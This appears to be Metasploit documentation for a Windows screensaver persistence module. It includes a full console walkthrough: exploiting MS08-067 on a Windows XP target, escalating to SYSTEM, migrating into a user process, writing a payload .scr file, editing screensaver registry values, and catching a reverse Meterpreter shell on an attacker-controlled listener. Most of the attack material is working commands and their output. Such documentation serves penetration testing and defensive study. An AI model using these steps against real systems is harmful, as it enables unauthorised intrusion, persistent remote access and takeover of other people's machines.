## Vulnerable Application

  This module sets a user's screensaver to a payload executable file, saved as a `.scr` file.
  The persistence technique has been documented in MITRE's ATT&CK's technique list.

## Verification Steps

  1. Start msfconsole
  2. Get a shell on the system (SYSTEM will result in the logged in user)
  3. Do: ```use windows/local/user_screensaver_persistence```
  4. Do: ```set writabledir```
  5. Do: ```run```
  6. Create a ```exploit/multi/handler``` with the correct payload and options
  7. Wait
  8. You should get a user level shell

## Options

  **SCREENSAVERTIMEOUT**

  How long to wait until the Screen Saver is activated.  Default is `60`

  **WritableDir**

  A folder which the user can write to.  Default is for Windows 7+ `C:\ProgramData\`

## Scenarios

### Windows XP

#### Initial Access

  ```
  msf5 > use 08-067
  
  Matching Modules
  ================
  
     #  Name                                 Disclosure Date  Rank   Check  Description
     -  ----                                 ---------------  ----   -----  -----------
     0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
  
  
  [*] Using exploit/windows/smb/ms08_067_netapi
  msf5 exploit(windows/smb/ms08_067_netapi) > set rhost 111.111.1.111
  rhost => 111.111.1.111
  msf5 exploit(windows/smb/ms08_067_netapi) > run
  
  [*] Started reverse TCP handler on 222.222.2.222:4444 
  [*] 111.111.1.111:445 - Automatically detecting the target...
  [*] 111.111.1.111:445 - Fingerprint: Windows XP - Service Pack 2 - lang:English
  [*] 111.111.1.111:445 - Selected Target: Windows XP SP2 English (AlwaysOn NX)
  [*] 111.111.1.111:445 - Attempting to trigger the vulnerability...
  [*] Sending stage (179779 bytes) to 111.111.1.111
  [*] Meterpreter session 1 opened (222.222.2.222:4444 -> 111.111.1.111:1032) at 2019-08-19 21:16:36 -0400
  
  meterpreter > getsystem
  ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
  ```

#### Migrate to a user account

  ```
  meterpreter > ps
  
  Process List
  ============
  
   PID   PPID  Name              Arch  Session  User                          Path
   ---   ----  ----              ----  -------  ----                          ----
   0     0     [System Process]                                               
   4     0     System            x86   0        NT AUTHORITY\SYSTEM           
   528   4     smss.exe          x86   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
   592   528   csrss.exe         x86   0        NT AUTHORITY\SYSTEM           \??\C:\WINDOWS\system32\csrss.exe
   616   528   winlogon.exe      x86   0        NT AUTHORITY\SYSTEM           \??\C:\WINDOWS\system32\winlogon.exe
   660   616   services.exe      x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\services.exe
   672   616   lsass.exe         x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\lsass.exe
   740   660   alg.exe           x86   0        NT AUTHORITY\LOCAL SERVICE    C:\WINDOWS\System32\alg.exe
   828   660   vmacthlp.exe      x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmacthlp.exe
   840   660   svchost.exe       x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\svchost.exe
   928   660   svchost.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\svchost.exe
   1012  1500  cmd.exe           x86   0        WINXP\userlvl                 C:\WINDOWS\system32\cmd.exe
   1020  660   svchost.exe       x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\System32\svchost.exe
   1068  660   svchost.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\svchost.exe

meterpreter > migrate 1012
[*] Migrating from 1020 to 1012...
[*] Migration completed successfully.
meterpreter > getuid
Server username: WINXP\userlvl
meterpreter > background
[*] Backgrounding session 1...
```

#### Module Usage

  ```
  msf5 exploit(windows/smb/ms08_067_netapi) > use exploit/windows/local/user_screensaver_persistence 
  msf5 exploit(windows/local/user_screensaver_persistence) > set session 1
  session => 1
  msf5 exploit(windows/local/user_screensaver_persistence) > set writabledir c:\\
  writabledir => c:\
  msf5 exploit(windows/local/user_screensaver_persistence) > run
  
  [*] Started reverse TCP handler on 222.222.2.222:4444 
  [*] Original SCRNSAVE.EXE value: C:\WINDOWS\system32\logon.scr
  [*] Original ScreenSaveActive value: 1
  [*] Original ScreenSaverTimeout value: 60
  [*] Original ScreenSaverIsSecure value: 0
  [+] Script to revert changes:
  reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d C:\WINDOWS\system32\logon.scr /f
  reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
  reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverTimeout /t REG_SZ /d 60 /f
  reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
  [*] Writing payload to c:\dsHpz2wix.scr
  [*] Changing screensaver
  [+] Screensaver set!
  [*] Exploit completed, but no session was created.
  msf5 exploit(windows/local/user_screensaver_persistence) > use exploit/multi/handler 
  msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
  payload => windows/meterpreter/reverse_tcp
  msf5 exploit(multi/handler) > set lhost 222.222.2.222
  lhost => 222.222.2.222
  msf5 exploit(multi/handler) > set lport 4444
  lport => 4444
  msf5 exploit(multi/handler) > run
  
  [*] Started reverse TCP handler on 222.222.2.222:4444 
  [*] Sending stage (179779 bytes) to 111.111.1.111
  [*] Meterpreter session 2 opened (222.222.2.222:4444 -> 111.111.1.111:1033) at 2019-08-19 21:19:08 -0400
  
  meterpreter > getuid
  Server username: WINXP\userlvl
  ```
